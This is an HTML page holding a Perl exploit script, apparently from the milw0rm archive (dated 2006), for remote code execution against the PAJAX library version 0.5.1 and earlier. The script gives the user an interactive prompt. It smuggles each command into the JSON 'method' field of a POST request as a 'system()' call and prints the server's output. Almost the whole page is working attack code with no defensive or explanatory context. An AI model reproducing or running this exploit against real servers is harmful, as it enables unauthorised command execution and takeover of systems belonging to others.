<html><head><title>PAJAX <= 0.5.1 Remote Code Execution Exploit</title></head><pre>#!/usr/bin/perl

use IO::Socket;

print &quot;PAJAX Remote Code Injection - code by: Stoney - exploit found
by: RedTeam\n&quot;;

if ($ARGV[0] &amp;&amp; $ARGV[1])
{
 $host = $ARGV[0];
 $path = $ARGV[1];
 $sock = IO::Socket::INET-&gt;new( Proto =&gt; &quot;tcp&quot;, PeerAddr =&gt; &quot;$host&quot;,
PeerPort =&gt; &quot;80&quot;) || die &quot;connecterror\n&quot;;
 while (1) {
   print '['.$host.']# ';
   $cmd = &lt;STDIN&gt;;
   chop($cmd);
   last if ($cmd eq 'exit');
   $ajaxdata = &quot;{\&quot;id\&quot;: \&quot;bb2238f1186dad8d6370d2bab5f290f71\&quot;, \&quot;className\&quot;: \&quot;Calculator\&quot;, \&quot;method\&quot;: \&quot;add(1,1);system($cmd);\$obj-&gt;add\&quot;, \&quot;params\&quot;: [\&quot;1\&quot;, \&quot;5\&quot;]}&quot;;

   print $sock &quot;POST &quot;.$path.&quot; HTTP/1.1\n&quot;;
   print $sock &quot;Host: &quot;.$host.&quot;\n&quot;;
   print $sock &quot;Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7&quot;;
   print $sock &quot;Content-Type: text/json\n&quot;;
   print $sock &quot;Content-Length:&quot;.length($ajaxdata).&quot;\n\n&quot;.$ajaxdata;
   while ($ans = &lt;$sock&gt;)
      {
       print &quot;$ans&quot;;
      }
  }
 }
else {
 print &quot;Usage: perl ajax.pl [host] [path_to_ajax]\n\n&quot;;
exit;
}

# milw0rm.com [2006-04-13]</pre></html>